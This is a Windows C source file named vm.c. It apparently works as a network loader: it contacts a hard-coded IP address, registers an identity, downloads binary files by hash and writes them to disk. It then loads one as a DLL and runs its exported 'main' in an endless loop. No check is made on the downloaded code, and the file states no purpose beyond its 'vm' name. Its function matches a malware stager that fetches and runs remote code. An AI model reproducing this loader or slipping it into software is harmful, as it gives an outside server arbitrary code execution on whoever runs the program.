// vm.c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <bcrypt.h>

#define HOST "124.221.146.23"
#define PORT 9000

typedef unsigned char Hash[32];
typedef unsigned char Identity[32];
typedef void (*ImpFn)(void);

__declspec(dllexport) void *ptr;
__declspec(dllexport) void *base;
__declspec(dllexport) void (*imp)(void);

void crash(){ *(int*)0 = 1; }

void allsend(SOCKET s, void *p, int n){
    while(n){
        int x = send(s, p, n, 0);
        if(x <= 0) crash();
        p = (char*)p + x;
        n -= x;
    }
}

void allrecv(SOCKET s, void *p, int n){
    while(n){
        int x = recv(s, p, n, 0);
        if(x <= 0) crash();
        p = (char*)p + x;
        n -= x;
    }
}

SOCKET conn(){
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));

    a.sin_family = AF_INET;
    a.sin_port = htons(PORT);
    a.sin_addr.s_addr = inet_addr(HOST);

    if(connect(s, (struct sockaddr*)&a, sizeof(a))) crash();

    return s;
}

void sha256(void *data, int size, Hash out){
    BCRYPT_ALG_HANDLE alg;
    BCRYPT_HASH_HANDLE h;
    DWORD objlen = 0, cb = 0;
    unsigned char *obj;

    BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptGetProperty(alg, BCRYPT_OBJECT_LENGTH, (unsigned char*)&objlen, sizeof(objlen), &cb, 0);

    obj = malloc(objlen);

    BCryptCreateHash(alg, &h, obj, objlen, NULL, 0, 0);
    BCryptHashData(h, data, size, 0);
    BCryptFinishHash(h, out, 32, 0);

    BCryptDestroyHash(h);
    BCryptCloseAlgorithmProvider(alg, 0);
    free(obj);
}

void str_sha(char *s, Hash out){
    sha256(s, (int)strlen(s), out);
}

void regid(Identity id){
    SOCKET s = conn();
    unsigned char op = 1, st;

    allsend(s, &op, 1);
    allrecv(s, &st, 1);
    if(st) crash();

    allrecv(s, id, 32);
    closesocket(s);
}

void getfirstchild(Hash parent, Hash child){
    Identity id;
    SOCKET s;
    unsigned char op = 5, st;

    regid(id);

    s = conn();

    allsend(s, &op, 1);
    allsend(s, id, 32);
    allsend(s, parent, 32);

    allrecv(s, &st, 1);
    if(st != 0) crash();

    allrecv(s, child, 32);

    closesocket(s);
}

unsigned int be32(unsigned char b[4]){
    return ((unsigned)b[0] << 24) |
           ((unsigned)b[1] << 16) |
           ((unsigned)b[2] << 8)  |
           b[3];
}

void hexhash(Hash h, char *out){
    char *x = "0123456789abcdef";

    for(int i = 0; i < 32; i++){
        out[i * 2]     = x[h[i] >> 4];
        out[i * 2 + 1] = x[h[i] & 15];
    }

    out[64] = 0;
}

char *download(Hash h){
    static char path[80];
    char hex[65];

    SOCKET s;
    unsigned char op = 3, st, b[4];
    unsigned int size;
    void *buf;
    FILE *f;

    hexhash(h, hex);
    sprintf(path, "%s.bin", hex);

    s = conn();

    allsend(s, &op, 1);
    allsend(s, h, 32);

    allrecv(s, &st, 1);
    if(st) crash();

    allrecv(s, b, 4);
    size = be32(b);

    buf = malloc(size);
    allrecv(s, buf, size);

    f = fopen(path, "wb");
    fwrite(buf, 1, size, f);
    fclose(f);

    free(buf);
    closesocket(s);

    return path;
}

void *readfile(char *path){
    FILE *f = fopen(path, "rb");
    void *buf;
    long size;

    if(!f) crash();

    fseek(f, 0, SEEK_END);
    size = ftell(f);
    rewind(f);

    buf = malloc(size);
    fread(buf, 1, size, f);

    fclose(f);

    return buf;
}

void execdll(char *path){
    HMODULE h = LoadLibraryA(path);
    if(!h) crash();

    imp = (ImpFn)GetProcAddress(h, "main");
    if(!imp) crash();
}

void boot(){
    WSADATA w;
    Hash a, b, c;
    char *path;

    WSAStartup(MAKEWORD(2,2), &w);

    str_sha("Cstart", a);

    getfirstchild(a, b);

    path = download(b);

    base = ptr = readfile(path);

    sha256((char*)ptr + sizeof(int32_t), *(int32_t*)ptr, c);

    execdll(download(c));
}

int main(){
    boot();

    while(1){
        imp();
    }
}